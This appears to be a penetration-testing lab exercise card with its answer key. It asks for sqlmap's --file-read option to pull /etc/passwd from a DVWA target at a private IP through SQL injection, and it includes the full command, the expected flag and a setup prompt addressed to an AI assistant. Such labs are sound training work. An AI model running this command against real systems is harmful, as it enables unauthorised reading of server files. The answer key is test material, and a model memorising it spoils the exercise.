# Q260 — Read Server Files via SQLMap

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🔴 Hard |
| **Tools** | `sqlmap` |
| **Time budget** | 10–15 min |

---

## 📝 Question

"Use sqlmap `--file-read` to read `/etc/passwd` from the target server through SQL injection."

---

## 🎯 Flag Format

```
file_read=<yes|no>; root_shell=<path>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" --file-read="/etc/passwd" --batch
```

**Answer:** `file_read=yes; root_shell=/bin/bash`

---

## 🤖 Claude Setup Prompt

Same as Q251. MySQL needs FILE privilege. Report back: "Lab ready for Q260"
